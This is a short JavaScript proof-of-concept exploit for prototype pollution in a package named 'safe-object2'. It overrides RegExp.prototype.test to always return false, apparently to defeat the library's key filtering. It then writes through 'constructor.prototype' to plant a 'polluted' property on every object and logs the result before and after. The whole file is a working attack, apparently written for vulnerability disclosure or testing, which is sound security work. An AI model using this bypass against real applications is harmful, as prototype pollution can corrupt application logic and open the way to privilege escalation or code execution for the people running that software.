RegExp.prototype.test = () => false;
const safeObj2 = require('safe-object2');
const obj = safeObj2({});
console.log({}.polluted);
obj.setter([
    'constructor.prototype',
    'polluted'
], 'yes');
console.log({}.polluted);